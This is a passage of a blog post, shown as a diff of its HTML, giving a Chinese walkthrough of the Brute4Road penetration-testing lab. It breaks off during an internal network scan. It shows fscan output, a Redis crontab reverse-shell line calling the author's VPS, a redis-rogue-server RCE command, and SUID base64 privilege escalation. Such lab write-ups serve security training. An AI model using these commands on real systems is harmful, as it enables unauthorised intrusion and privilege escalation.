@@ -1,0 +1,967 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>春秋云境-Brute4Road综合渗透 - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="春秋云境-Brute4Road综合渗透" />
+<meta property="og:description" content="春秋云境-Brute4Road综合渗透通关wp" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/chunqiuyunjing-brute4road/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-02-18T00:00:00+08:00" />
+<meta property="article:modified_time" content="2025-02-18T00:00:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta name="twitter:title" content="春秋云境-Brute4Road综合渗透"/>
+<meta name="twitter:description" content="春秋云境-Brute4Road综合渗透通关wp"/>
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/chunqiuyunjing-brute4road/" /><link rel="prev" href="http://scofield1920.github.io/chunqiuyunjing-delivery/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "春秋云境-Brute4Road综合渗透",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/chunqiuyunjing-brute4road\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "penetration, wp","wordcount":  892 ,
+        "url": "http:\/\/scofield1920.github.io\/chunqiuyunjing-brute4road\/","datePublished": "2025-02-18T00:00:00+08:00","dateModified": "2025-02-18T00:00:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sc0fie1d"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#flag01">flag01</a></li>
+    <li><a href="#flag02">flag02</a></li>
+    <li><a href="#flag03">flag03</a></li>
+    <li><a href="#flag04">flag04</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">春秋云境-Brute4Road综合渗透</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/penetration/"><i class="far fa-folder fa-fw"></i>Penetration</a>&nbsp;<a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>Wp</a></span></div>
+            <div class="post-meta-line">
+    
+
+    
+        
+
+        
+        
+            <span id="busuanzi_container_value_page_pv"><i class="far fa-eye fa-fw"></i>
+                
+                <span id="busuanzi_value_page_pv"></span>&nbsp;views</span>
+        
+    
+
+<i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2025-02-18">2025-02-18</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2025-02-18">2025-02-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;892 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#flag01">flag01</a></li>
+    <li><a href="#flag02">flag02</a></li>
+    <li><a href="#flag03">flag03</a></li>
+    <li><a href="#flag04">flag04</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>春秋云境-Brute4Road综合渗透通关wp</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218215044448.png?imageSlim" title="image-20250218215044448" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218215044448.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218215044448.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218215044448.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218215044448.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218215044448.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20250218215044448">
+    </a></figure></p>
+<p>靶标介绍：</p>
+<p>Brute4Road是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。</p>
+<h2 id="flag01" class="headerLink">
+    <a href="#flag01" class="header-mark"></a>flag01</h2><p>起手fscan</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">E:<span class="se">\T</span>ools<span class="se">\w</span>eb<span class="se">\f</span>scan_1.8.4&gt;fscan.exe -h 39.99.144.164
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   ___                              _
+</span></span><span class="line"><span class="cl">  / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __
+</span></span><span class="line"><span class="cl"> / /_<span class="se">\/</span>____/ __<span class="p">|</span>/ __<span class="p">|</span> <span class="err">&#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /
+</span></span><span class="line"><span class="cl">/ /_<span class="se">\\</span>_____<span class="se">\_</span>_ <span class="se">\ </span><span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span>   &lt;
+</span></span><span class="line"><span class="cl"><span class="se">\_</span>___/     <span class="p">|</span>___/<span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span><span class="se">\_\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>                     fscan version: 1.8.4
+</span></span><span class="line"><span class="cl">start infoscan
+</span></span><span class="line"><span class="cl">39.99.144.164:21 open
+</span></span><span class="line"><span class="cl">39.99.144.164:22 open
+</span></span><span class="line"><span class="cl">39.99.144.164:80 open
+</span></span><span class="line"><span class="cl">39.99.144.164:6379 open
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> alive ports len is: <span class="m">4</span>
+</span></span><span class="line"><span class="cl">start vulscan
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://39.99.144.164      code:200 len:4833   title:Welcome to CentOS
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> ftp 39.99.144.164:21:anonymous
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>pub
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Redis 39.99.144.164:6379 unauthorized file:/usr/local/redis/db/dump.rdb
+</span></span><span class="line"><span class="cl">已完成 4/4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现redis</p>
+<p><a href="https://www.freebuf.com/articles/web/249238.html" target="_blank" rel="noopener noreferrer">Redis系列漏洞总结 - FreeBuf网络安全行业门户</a></p>
+<p>尝试写计划任务反弹shell，提示权限不够</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> xz <span class="s2">&#34;\n* * * * * bash -i &gt;&amp; /dev/tcp/39.106.75.37/9999 0&gt;&amp;1\n&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218132725-a2a9jgs.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218132725-a2a9jgs.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218132725-a2a9jgs.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218132725-a2a9jgs.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218132725-a2a9jgs.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218132725-a2a9jgs.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p>Redis 主从复制RCE</p>
+<p><a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener noreferrer">n0b0dyCN/redis-rogue-server: Redis(&lt;=5.0.5) RCE</a></p>
+<p>（主从复制极有可能把靶机打崩，因此我们利用成功之后若是不小心退出了shell，只能重启环境。）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 redis-rogue-server.py --rhost 39.99.144.164 --lhost 39.106.75.37 --lport <span class="m">6666</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140031-4bqdvmr.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140031-4bqdvmr.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140031-4bqdvmr.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140031-4bqdvmr.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140031-4bqdvmr.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140031-4bqdvmr.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p>vps拿到shell之后创建一个伪终端</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140120-ulsazlf.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140120-ulsazlf.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140120-ulsazlf.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140120-ulsazlf.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140120-ulsazlf.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140120-ulsazlf.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p>找到flag，权限不够，尝试suid提权</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140227-pnpdhnv.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140227-pnpdhnv.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140227-pnpdhnv.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140227-pnpdhnv.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140227-pnpdhnv.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140227-pnpdhnv.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140330-802jcn6.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140330-802jcn6.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140330-802jcn6.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140330-802jcn6.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140330-802jcn6.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140330-802jcn6.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p>发现base64可利用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">base64 <span class="s2">&#34;/home/redis/flag/flag01&#34;</span> <span class="p">|</span> base64 --decode
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140501-g69g3ha.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140501-g69g3ha.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140501-g69g3ha.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140501-g69g3ha.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140501-g69g3ha.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140501-g69g3ha.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<h2 id="flag02" class="headerLink">
+    <a href="#flag02" class="header-mark"></a>flag02</h2><p>搜集信息，ifconfig发现没有该命令</p>
+<p>使用<code>netstat -antp</code>​</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218141920-hao05gu.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218141920-hao05gu.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218141920-hao05gu.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218141920-hao05gu.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218141920-hao05gu.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218141920-hao05gu.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p>上传fscan frpc frpc.ini到靶机</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>redis@centos-web01 tmp<span class="o">]</span>$ ./fscan -h 172.22.2.7/24
+</span></span><span class="line"><span class="cl">./fscan -h 172.22.2.7/24
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   ___                              _  
+</span></span><span class="line"><span class="cl">  / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __ 
+</span></span><span class="line"><span class="cl"> / /_<span class="se">\/</span>____/ __<span class="p">|</span>/ __<span class="p">|</span> <span class="err">&#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /
+</span></span><span class="line"><span class="cl">/ /_<span class="se">\\</span>_____<span class="se">\_</span>_ <span class="se">\ </span><span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span>   &lt;  
+</span></span><span class="line"><span class="cl"><span class="se">\_</span>___/     <span class="p">|</span>___/<span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span>  
+</span></span><span class="line"><span class="cl">                     fscan version: 1.8.4
+</span></span><span class="line"><span class="cl">start infoscan
+</span></span><span class="line"><span class="cl">trying RunIcmp2
+</span></span><span class="line"><span class="cl">The current user permissions unable to send icmp packets
+</span></span><span class="line"><span class="cl">start ping
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.2.3      is alive
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.2.16     is alive
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.2.7      is alive
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.2.34     is alive
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.2.18     is alive
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Icmp alive hosts len is: <span class="m">5</span>
+</span></span><span class="line"><span class="cl">172.22.2.3:135 open
+</span></span><span class="line"><span class="cl">172.22.2.18:80 open
+</span></span><span class="line"><span class="cl">172.22.2.16:80 open
+</span></span><span class="line"><span class="cl">172.22.2.18:22 open
+</span></span><span class="line"><span class="cl">172.22.2.7:80 open
+</span></span><span class="line"><span class="cl">172.22.2.7:22 open
+</span></span><span class="line"><span class="cl">172.22.2.7:21 open
+</span></span><span class="line"><span class="cl">172.22.2.3:88 open
+</span></span><span class="line"><span class="cl">172.22.2.7:6379 open
+</span></span><span class="line"><span class="cl">172.22.2.16:1433 open
+</span></span><span class="line"><span class="cl">172.22.2.18:445 open
+</span></span><span class="line"><span class="cl">172.22.2.34:445 open
+</span></span><span class="line"><span class="cl">172.22.2.3:445 open
+</span></span><span class="line"><span class="cl">172.22.2.18:139 open
+</span></span><span class="line"><span class="cl">172.22.2.16:139 open
+</span></span><span class="line"><span class="cl">172.22.2.34:139 open
+</span></span><span class="line"><span class="cl">172.22.2.3:139 open
+</span></span><span class="line"><span class="cl">172.22.2.34:135 open
+</span></span><span class="line"><span class="cl">172.22.2.16:135 open
+</span></span><span class="line"><span class="cl">172.22.2.16:445 open
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> alive ports len is: <span class="m">20</span>
+</span></span><span class="line"><span class="cl">start vulscan
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.2.16
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>MSSQLSERVER
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.2.16
